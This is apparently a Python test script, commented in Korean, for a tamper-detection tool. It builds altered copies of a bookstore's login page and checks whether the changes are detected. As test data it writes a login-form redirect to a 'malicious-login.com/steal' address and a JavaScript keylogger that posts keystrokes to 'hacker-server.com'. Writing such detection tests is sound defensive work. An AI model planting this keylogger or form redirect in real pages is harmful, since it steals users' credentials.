#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
간단한 변조 감지 테스트
지시사항에 맞는 간단하고 직접적인 테스트 방식
"""

import requests
import os
import hashlib
import datetime
from simple_compare import is_html_changed, is_html_exactly_equal

# 테스트 로그 파일 경로
TEST_LOG_FILE = "simple_test.log"

def log_test_message(message):
    """테스트 로그 메시지 기록"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {message}\n"
    
    with open(TEST_LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(message)

def download_original_page():
    """원본 페이지 다운로드"""
    print("📥 교보문고 로그인 페이지 다운로드 중...")
    
    url = "https://mmbr.kyobobook.co.kr/login"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        response = requests.get(url, headers=headers, timeout=30)
        response.raise_for_status()
        
        # 원본 파일 저장
        with open('kyobo_login_original.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print("✅ 원본 페이지 저장: kyobo_login_original.html")
        print(f"📊 파일 크기: {len(response.text):,}자")
        return response.text
        
    except Exception as e:
        print(f"❌ 다운로드 실패: {e}")
        return None

def create_modified_versions():
    """변조된 버전들 생성 (수동 변조 시뮬레이션)"""
    print("\n🔧 변조된 버전들 생성 중...")
    
    if not os.path.exists('kyobo_login_original.html'):
        print("❌ 원본 파일이 없습니다. 먼저 다운로드를 실행하세요.")
        return False
    
    # 원본 파일 읽기
    with open('kyobo_login_original.html', 'r', encoding='utf-8') as f:
        original_html = f.read()
    
    # 1. URL 변조 버전
    url_modified = original_html.replace(
        'https://mmbr.kyobobook.co.kr',
        'https://evil-site.com'
    ).replace(
        'action="/login"',
        'action="https://malicious-login.com/steal"'
    )
    
    with open('kyobo_login_url_modified.html', 'w', encoding='utf-8') as f:
        f.write(url_modified)
    print("✅ URL 변조 버전: kyobo_login_url_modified.html")
    
    # 2. 악성 스크립트 추가 버전
    malicious_script = '''
    <script>
    // 악의적인 키로거
    document.addEventListener('keypress', function(e) {
        fetch('https://hacker-server.com/keylog', {
            method: 'POST',
            body: JSON.stringify({key: e.key, target: e.target.name})
        });
    });
    </script>'''
    
    script_modified = original_html.replace('</head>', f'{malicious_script}</head>')
    with open('kyobo_login_script_modified.html', 'w', encoding='utf-8') as f:
        f.write(script_modified)
    print("✅ 스크립트 추가 버전: kyobo_login_script_modified.html")
    
    # 3. 텍스트 변조 버전
    text_modified = original_html.replace('교보문고', '가짜문고').replace('로그인', '정보입력')
    with open('kyobo_login_text_modified.html', 'w', encoding='utf-8') as f:
        f.write(text_modified)
    print("✅ 텍스트 변조 버전: kyobo_login_text_modified.html")
    
    return True

def test_detection():
    """변조 감지 테스트"""
    print("\n🧪 변조 감지 테스트")
    print("=" * 50)
    
    # 로컬 서버에서 파일들 가져오기
    base_url = "http://localhost:8000"
    
    try:
        # 원본 가져오기
        original_response = requests.get(f"{base_url}/kyobo_login_original.html", timeout=10)
        original_response.raise_for_status()
        original_html = original_response.text
        print("✅ 원본 페이지 로드 완료")
        
        # 테스트 케이스들
        test_cases = [
            ("kyobo_login_url_modified.html", "URL 변조"),
            ("kyobo_login_script_modified.html", "악성 스크립트 추가"),
            ("kyobo_login_text_modified.html", "텍스트 변조")
        ]
        
        results = []
        
        for filename, description in test_cases:
            print(f"\n📋 {description} 테스트")
            print("-" * 30)
            
            try:
                # 변조된 페이지 가져오기
                modified_response = requests.get(f"{base_url}/{filename}", timeout=10)
                modified_response.raise_for_status()
                modified_html = modified_response.text
                
                # 해시 계산
                original_hash = hashlib.sha256(original_html.encode('utf-8')).hexdigest()
                modified_hash = hashlib.sha256(modified_html.encode('utf-8')).hexdigest()
                hash_different = original_hash != modified_hash
                
                # 변조 감지 (기존 방식)
                changed = is_html_changed(original_html, modified_html)
                
                # 변조 감지 (필터링 방식)
                filtered_changed = not is_html_exactly_equal(original_html, modified_html)
                
                # 로그에 상세 정보 기록
                log_message = f"[{description}] 원본해시: {original_hash[:16]}..., 변조해시: {modified_hash[:16]}..., 기존방식: {changed}, 필터링방식: {filtered_changed}"
                log_test_message(log_message)
                
                print(f"  기존 방식 결과: {'변조 감지됨' if changed else '변조 감지 안됨'}")
                print(f"  필터링 방식 결과: {'변조 감지됨' if filtered_changed else '변조 감지 안됨'}")
                print(f"  파일: {filename}")
                print(f"  크기: {len(modified_html):,}자")
                
                results.append({
                    'description': description,
                    'filename': filename,
                    'detected': changed,
                    'filtered_detected': filtered_changed,
                    'size': len(modified_html)
                })
                
            except Exception as e:
                print(f"  ❌ 테스트 실패: {e}")
                results.append({
                    'description': description,
                    'filename': filename,
                    'detected': False,
                    'filtered_detected': False,
                    'size': 0
                })
        
        # 결과 요약
        print("\n" + "=" * 50)
        print("📊 테스트 결과 요약")
        print("=" * 50)
        
        success_count = 0
        filtered_success_count = 0
        for result in results:
            status = "✅" if result['detected'] else "❌"
            filtered_status = "✅" if result['filtered_detected'] else "❌"
            result_msg = f"{status} {result['description']} (기존): {'감지됨' if result['detected'] else '감지 안됨'}"
            filtered_msg = f"{filtered_status} {result['description']} (필터링): {'감지됨' if result['filtered_detected'] else '감지 안됨'}"
            print(result_msg)
            print(filtered_msg)
            log_test_message(result_msg)
            log_test_message(filtered_msg)
            if result['detected']:
                success_count += 1
            if result['filtered_detected']:
                filtered_success_count += 1
        
        summary_msg = f"📈 기존 방식 결과: {success_count}/{len(results)} 성공"
        filtered_summary_msg = f"📈 필터링 방식 결과: {filtered_success_count}/{len(results)} 성공"
        print(f"\n{summary_msg}")
        print(filtered_summary_msg)
        log_test_message(summary_msg)
        log_test_message(filtered_summary_msg)
        
        if success_count == len(results) and filtered_success_count == len(results):
            final_msg = "🎉 모든 변조가 두 방식 모두에서 정상적으로 감지되었습니다!"
            print(final_msg)
            log_test_message(final_msg)
        elif filtered_success_count == len(results):
            final_msg = "✅ 필터링 방식에서 모든 변조가 감지되었습니다!"
            print(final_msg)
            log_test_message(final_msg)
        else:
            final_msg = "⚠️  일부 변조가 감지되지 않았습니다."
            print(final_msg)
            log_test_message(final_msg)
        
        return results
        
    except Exception as e:
        print(f"❌ 테스트 실패: {e}")
        return None

def main():
    """메인 테스트 함수"""
    # 로그 파일 초기화
    with open(TEST_LOG_FILE, "w", encoding="utf-8") as f:
        f.write(f"=== 간단한 변조 감지 테스트 시작 - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    
    log_test_message("🧪 간단한 변조 감지 테스트 시작")
    print("=" * 50)
    
    # 1. 원본 페이지 다운로드
    if not download_original_page():
        return
    
    # 2. 변조된 버전들 생성
    if not create_modified_versions():
        return
    
    # 3. 로컬 서버 자동 시작
    print("\n🌐 로컬 HTTP 서버 시작 중...")
    import subprocess
    import time
    
    try:
        # 서버 프로세스 시작
        server_process = subprocess.Popen(
            ["python3", "-m", "http.server", "8000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 서버 시작 대기
        time.sleep(3)
        
        # 서버 상태 확인
        test_response = requests.get("http://localhost:8000/kyobo_login_original.html", timeout=5)
        if test_response.status_code == 200:
            print("✅ 로컬 서버가 정상적으로 시작되었습니다.")
        else:
            print("❌ 서버 응답이 비정상입니다.")
            return
            
    except Exception as e:
        print(f"❌ 서버 시작 실패: {e}")
        return
    
    # 4. 변조 감지 테스트
    try:
        test_detection()
    finally:
        # 서버 종료
        print("\n🛑 로컬 서버 종료 중...")
        server_process.terminate()
        server_process.wait()
        print("✅ 서버가 종료되었습니다.")
    
    log_test_message("🏁 테스트 완료")
    print("\n📁 생성된 파일들:")
    print("  - kyobo_login_original.html (원본)")
    print("  - kyobo_login_url_modified.html (URL 변조)")
    print("  - kyobo_login_script_modified.html (스크립트 추가)")
    print("  - kyobo_login_text_modified.html (텍스트 변조)")
    print(f"  - {TEST_LOG_FILE} (테스트 로그)")
    
    log_test_message(f"=== 테스트 완료 - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===")

if __name__ == "__main__":
    main() 